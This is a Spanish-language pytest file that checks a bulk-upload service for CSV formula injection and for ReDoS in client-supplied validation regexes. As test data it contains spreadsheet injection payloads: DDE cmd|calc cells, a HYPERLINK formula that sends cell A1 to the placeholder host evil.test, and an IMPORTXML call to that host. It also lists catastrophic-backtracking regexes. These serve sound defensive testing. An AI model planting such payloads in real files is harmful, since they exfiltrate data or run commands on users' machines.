"""T-143 (CC-REQ-045, 042; design.md §10.1, §10.3): inyección de fórmulas en el CSV de errores de la
carga masiva (COL-21) y ReDoS en ``formato_validacion`` de los campos.

CSV: una celda que empieza con ``=``, ``+``, ``-``, ``@``, tabulador o retorno de carro se antepone con
un apóstrofo (OWASP, "CSV Injection"). Se prueba la función y el endpoint real con filas hostiles.

ReDoS: el formato se evalúa con ``re2`` (tiempo lineal; sin referencias hacia atrás ni lookahead).
Se prueba que (1) el servicio de campos rechaza lo que ``re2`` no admite y los formatos de más de 200
caracteres, (2) los patrones "catastróficos" clásicos se aceptan (``re2`` los resuelve en tiempo lineal)
y la validación de un valor largo termina rápido, y (3) ningún código de producción compila con ``re``
un patrón que escribió el cliente. Sin límites de tiempo ajustados: la cota es generosa y un motor con
retroceso tardaría días con estas entradas.
"""

import csv
import io
import re
import time
from pathlib import Path

import pytest
from cc_colaboradores.servicios.cargas import PREFIJOS_FORMULA, neutralizar

RAIZ = Path(__file__).resolve().parents[2]

# --------------------------------------------------------------------------- CSV


@pytest.mark.parametrize("prefijo", ["=", "+", "-", "@", "\t", "\r"])
def test_las_celdas_que_empiezan_como_formula_se_neutralizan(prefijo):
    for celda in (
        f"{prefijo}1+1",
        f"{prefijo}cmd|' /C calc'!A0",
        f'{prefijo}HYPERLINK("http://evil.test","clic")',
        f"{prefijo}",
    ):
        salida = neutralizar(celda)
        assert salida.startswith("'") and salida[1:] == celda


def test_el_catalogo_de_prefijos_cubre_lo_que_owasp_pide():
    assert set(PREFIJOS_FORMULA) >= {"=", "+", "-", "@", "\t", "\r"}


@pytest.mark.parametrize(
    "celda", ["texto normal", "ERROR_CODIGO", "123", "1+1", "a=b", " =1+1", ""]
)
def test_las_celdas_normales_no_se_modifican(celda):
    assert neutralizar(celda) == celda


@pytest.mark.docker
async def test_el_reporte_de_errores_no_trae_celdas_con_formulas(mundo_seg):
    w = mundo_seg
    hostiles = [
        '=HYPERLINK("http://evil.test/"&A1,"ver")',
        "+1+cmd|' /C calc'!A0",
        "-2+3",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "\t=1+1",
        "\r=1+1",
        '=IMPORTXML("http://evil.test","//a")',
    ]
    carga = w.sql(
        "INSERT INTO colaboradores.carga_colaboradores (empresa_id, usuario_id, nombre_archivo, "
        "version_plantilla, total_filas, filas_error, estado) VALUES (%s, %s, '=cmd.xlsx', '1.3', %s, "
        "%s, 'TERMINADA') RETURNING id",
        (w.a.id, w.a.usuario_id, len(hostiles), len(hostiles)),
    )[0][0]
    for n, valor in enumerate(hostiles, start=3):
        # el código y el texto del error son lo que escribe el validador; aquí llevan valores hostiles
        # (por ejemplo, el nombre de una columna del archivo del propio cliente)
        w.sql(
            "INSERT INTO colaboradores.fila_carga (empresa_id, carga_id, numero_fila, resultado, "
            "mensaje) VALUES (%s, %s, %s, 'ERROR', %s)",
            (w.a.id, carga, n, f"{valor}: {valor}"),
        )
    r = await w.http_col.get(f"/api/v1/cargas/{carga}/errores", headers=w.a.rh)
    assert r.status_code == 200
    assert r.headers["content-type"].startswith("text/csv")
    assert (
        "attachment" in r.headers["content-disposition"]
        and ".csv" in r.headers["content-disposition"]
    )
    assert (
        "=cmd" not in r.headers["content-disposition"]
    )  # el nombre del archivo no lo pone el usuario
    texto = r.content.decode("utf-8-sig")
    filas = list(csv.reader(io.StringIO(texto, newline="")))
    assert filas[0] == ["fila", "codigo", "mensaje"]
    celdas = [c for f in filas[1:] for c in f]
    assert len(filas) - 1 >= len(hostiles)
    for celda in celdas:
        assert not celda.startswith(PREFIJOS_FORMULA), f"celda que Excel evaluaría: {celda!r}"
    # el contenido se conserva (con el apóstrofo delante), no se pierde
    assert any(c == "'" + hostiles[0] for c in celdas)
    assert any(c == "'" + hostiles[4] for c in celdas)


# --------------------------------------------------------------------------- ReDoS: el servicio de campos

CATASTROFICOS = [
    r"(a+)+$",
    r"(a|aa)+$",
    r"(a*)*b",
    r"([a-zA-Z]+)*\d",
    r"(.*a){20}",
    r"^(([a-z])+.)+[A-Z]([a-z])+$",
    r"(x+x+)+y",
]
SIN_RE2 = [r"(a)\1", r"(?=a)a", r"(?!a)b", r"(?<=a)b", r"(?<!a)b", r"(?>a+)b", r"(a)(?(1)b|c)"]


def _errores(r) -> list[str]:
    return [e["codigo"] for e in r.json().get("errores", [])]


@pytest.mark.docker
async def test_el_servicio_de_campos_rechaza_lo_que_re2_no_admite_y_lo_demasiado_largo(mundo_seg):
    w = mundo_seg
    for i, patron in enumerate([*SIN_RE2, "a" * 201, "(" * 50, "[a-", "*abc"]):
        r = await w.http_campos.post(
            "/api/v1/campos",
            json={"nombre_campo": f"Prueba {i}", "clave": f"redos_{i}", "tipo_dato": "TEXTO",
                  "formato_validacion": patron},
            headers=w.a.rh,
        )  # fmt: skip
        assert r.status_code == 422, (patron[:30], r.status_code)
        if len(patron) <= 200:  # más de 200: lo corta el esquema de entrada, con otro código
            assert "FORMATO_INVALIDO" in _errores(r), patron[:30]
        assert patron[:20] not in r.text or len(patron) < 5  # el error no repite el patrón entero
    # el tipo FECHA o LISTA no admite formato
    r = await w.http_campos.post(
        "/api/v1/campos",
        json={"nombre_campo": "Fecha", "clave": "fecha_x", "tipo_dato": "FECHA",
              "formato_validacion": "a+"},
        headers=w.a.rh,
    )  # fmt: skip
    assert r.status_code == 422 and "FORMATO_NO_APLICA" in _errores(r)


@pytest.mark.docker
async def test_los_patrones_catastroficos_se_aceptan_y_se_validan_en_tiempo_acotado(mundo_seg):
    """Con un motor de retroceso, ``(a+)+$`` sobre 'aaaa…!' tarda más que la edad del universo; con
    ``re2`` es lineal. Se crea el campo por la API y se valida un valor largo con el validador real."""
    from cc_colaboradores.campos_cliente import DefinicionCampo
    from cc_colaboradores.validador_campos import TEXTO_MAXIMO, ValidadorCampos

    w = mundo_seg
    hostil = "a" * (TEXTO_MAXIMO - 1) + "!"  # lo más largo que llega a la expresión
    enorme = "a" * 50_000 + "!"  # el límite de longitud lo corta antes de evaluar
    for i, patron in enumerate(CATASTROFICOS):
        r = await w.http_campos.post(
            "/api/v1/campos",
            json={"nombre_campo": f"Cat {i}", "clave": f"cat_{i}", "tipo_dato": "TEXTO",
                  "formato_validacion": patron},
            headers=w.a.rh,
        )  # fmt: skip
        # lo que re2 acepta se crea; si lo rechazara, también estaría bien (nunca se evalúa con re)
        assert r.status_code in (201, 422), (patron, r.status_code, r.text[:120])
        if r.status_code == 422:
            assert "FORMATO_INVALIDO" in _errores(r)
        definicion = DefinicionCampo(1, "Cat", f"cat_{i}", "CAMP-0001", "TEXTO", False,
                                     formato_validacion=patron)  # fmt: skip
        validador = ValidadorCampos([definicion])
        t0 = time.perf_counter()
        validador.validar(
            {"CAMP-0001": hostil}
        )  # el resultado (válido o no) no importa: el tiempo sí
        _, errores = validador.validar({"CAMP-0001": enorme})
        assert [e.codigo for e in errores] == ["DEMASIADO_LARGO"]
        assert time.perf_counter() - t0 < 5, f"{patron} tardó demasiado"


def test_el_validador_de_valores_resuelve_patrones_catastroficos_sin_colgarse():
    """Misma comprobación sin base de datos, sobre el validador de la carga masiva y del alta."""
    import re2
    from cc_colaboradores.validador_campos import _coincide

    hostil = "a" * 100_000 + "!"
    for patron in CATASTROFICOS:
        t0 = time.perf_counter()
        assert _coincide(patron, hostil) in (True, False)
        assert time.perf_counter() - t0 < 5, patron
    assert re2.compile(r"(a+)+$").fullmatch("a" * 100_000 + "!") is None


def test_ningun_codigo_de_produccion_compila_con_re_un_patron_del_cliente():
    """``formato_validacion`` solo se toca con ``re2``: ni ``re.compile(formato...)`` ni
    ``re.fullmatch(d.formato...)`` en los servicios."""
    sospechosos = []
    patron = re.compile(r"\bre\.(compile|match|fullmatch|search|findall|sub)\([^)]*formato", re.I)
    for ruta in (RAIZ / "services").rglob("*.py"):
        if "/tests/" in ruta.as_posix() or "migrations" in ruta.parts:
            continue
        for n, linea in enumerate(ruta.read_text("utf-8").splitlines(), 1):
            if patron.search(linea):
                sospechosos.append(f"{ruta.relative_to(RAIZ)}:{n}: {linea.strip()}")
    assert not sospechosos, sospechosos
    for modulo in (
        "campos/cc_campos/servicios/campos.py",
        "colaboradores/cc_colaboradores/validador_campos.py",
    ):
        fuente = (RAIZ / "services" / modulo).read_text("utf-8")
        assert "import re2" in fuente and not re.search(r"^import re$", fuente, re.M), modulo
